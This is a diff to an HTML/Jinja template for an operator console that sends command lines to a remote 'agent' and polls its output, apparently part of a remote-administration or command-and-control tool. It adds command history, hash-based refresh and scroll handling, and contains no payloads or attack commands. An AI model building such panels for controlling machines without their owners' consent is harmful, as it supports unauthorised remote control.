@@ -5,39 +5,156 @@
 <div class="container"> 
 <section id="main_content">
     
-    <span id="terminal">
-    </span>
-
-    <br>
-    <input type="text" name="cmd" id="cmd" onkeypress="keypressed(event)" style="width: auto" />
-    <button type="submit" onclick="send_command()">Send</button>
-
+    <div id="terminal">
+    </div>
+	
+	<div style="width:80%;height:40px;">
+		<div id="msg-term-update">
+		&#8595; Terminal updated &#8595;
+		</div>
+	</div>
+    
+	<div>
+    <input type="text" name="cmd" id="cmd" style="width: auto" />
+    <button id="send-btn" type="submit">Send</button>
+	</div>
+	
     <script>
-    function keypressed(e){
-        if(e.keyCode === 13){
-        send_command();
-        }
-        return false;
-    }
-    function send_command(e) {
-        $.post("{{ url_for('api.push_command', agent_id=agent.id) }}", {'cmdline': $('#cmd').val()});
-        $('#cmd').val('');
-        return false;
-    }
-    function refresh_term() {
-        var termdiv = $('#termtext');
-        if (!$('#terminal').is(':hover')) {
-            $('#terminal').load("{{ url_for('api.agent_console', agent_id=agent.id) }}", '' , 
-            function() {
-                var termdiv = document.getElementById('termtext');
-                termdiv.scrollTop = termdiv.scrollHeight;
-            });
-        }
-    }
+	(function(){
+	
+		// list of the last commands
+		var commandHistory = [];
+		
+		// max number of remembered commands
+		var COMMAND_HISTORY_MAX_SIZE = 100;
+		
+		// index of the command displayed in the input field
+		var currentHistoryIndex = -1;
+		
+		// the hash of the current console output
+		var currentMd5Hash = $.md5("");
+	
+		/**
+		 * Add an entry in the command history, if the max size is reached, the oldest commands is removed.
+		 * @param cmd the command line to add the list.
+		 */
+		function addComandToHistory(cmd){
+			commandHistory.push(cmd);
+			
+			if(commandHistory.length > COMMAND_HISTORY_MAX_SIZE){
+				commandHistory.splice(0, 1);
+			}
+			
+			currentHistoryIndex = commandHistory.length;
+		}
+		/**
+		 * listening keypress on command prompt field.
+		 */
+		$('#cmd').keypress(function(e){
+			onCommandKeypressedAction(e);
+		});
 
-    $(document).ready(function(){
-        setInterval(refresh_term, 500);
-    });
+		/**
+		 * While focusing the command field, handle actions when pressing the ENTER, KEY_UP or KEY_DOWN button.
+		 * Send the command to the server when pressing ENTER.
+		 * Navigate through the cmd history when pressing the KEY_UP or KEY_DOWN button.
+		 * @param e the current event.
+		 */
+		function onCommandKeypressedAction(e){
+			var displayValue = '';
+			
+			if(e.keyCode === 13){ // ENTER
+				sendCommand();				
+			}else if(e.keyCode == 38){ // KEY_UP
+				if(currentHistoryIndex > 0){
+					currentHistoryIndex--;
+					$('#cmd').val(commandHistory[currentHistoryIndex]);
+				}				
+			}else if(e.keyCode == 40){ // KEY_DOWN
+				if(currentHistoryIndex < commandHistory.length){
+					currentHistoryIndex++;
+					displayValue = (currentHistoryIndex == commandHistory.length)? '': commandHistory[currentHistoryIndex];
+					$('#cmd').val(commandHistory[currentHistoryIndex]);
+				}	
+			}
+			
+			return false;
+		}
+		
+		/**
+		 * Send the command in the command field to the server and add it in the command history.
+		 */
+		function sendCommand() {
+			$.post("{{ url_for('api.push_command', agent_id=agent.id) }}", 
+					{'cmdline': $('#cmd').val()}, function(){});
+					
+			addComandToHistory($('#cmd').val());
+			$('#cmd').val('');
+			return false;
+		}
+		
+		/**
+		 * send the command when clicking on the send bouton.
+		 */
+		$('#send-btn').click(function(){
+			sendCommand();
+		});
+		
+		/**
+		  * Refresh the terminal if the console output changed.
+		  */
+		function refreshTerminal() {
+
+			$.get("{{ url_for('api.agent_console', agent_id=agent.id) }}", function(data) {
+				var oldScrollPosition, newScrollPosition;
+				var scrollToBottom = true;
+				var currentHtmlHash = $.md5(data);
+					
+				if(currentMd5Hash != currentHtmlHash){
+					currentMd5Hash = currentHtmlHash; // keep the hash in global scope to compare it at the next iteration
+					oldScrollPosition = $('#termtext').scrollTop();
+					scrollToBottom = (typeof oldScrollPosition == "undefined" || oldScrollPosition + 503 == $('#termtext').prop('scrollHeight'))? true: false;
+					$('#terminal').html(data);
+					newScrollPosition = (scrollToBottom == true)? $('#termtext').prop('scrollHeight') : oldScrollPosition;
+					$('#termtext').scrollTop(newScrollPosition);
+					
+					if(typeof oldScrollPosition != "undefined" && scrollToBottom == false){
+						$('#msg-term-update').show();
+					}else{
+						$('#msg-term-update').hide();
+					}
+					terminalScrollAction();
+					
+				}
+			});
+		}
+		
+		/**
+		 * Scroll the terminal to the bottom when clicking "Terminal updated" message and hide it.
+		 */
+		$('#msg-term-update').click(function(){
+			$('#termtext').scrollTop($('#termtext').prop('scrollHeight'));
+			$(this).hide();
+		});
+		
+		/**
+		 * Hide the message "Terminal updated" when the scrollbar reaches the bottom.
+		 */
+		 function terminalScrollAction(){
+			$('#termtext').on('scroll', function() {
+			   if($('#termtext').scrollTop() + 503 == $('#termtext').prop('scrollHeight') ) {
+					$('#msg-term-update').hide();
+			   }
+			});
+		}
+		
+		/**
+		 * Call the refresh terminal fonction twice each second.
+		 */
+		$(document).ready(function(){
+			setInterval(refreshTerminal, 500);
+		});
+	})();
 
     </script>
 
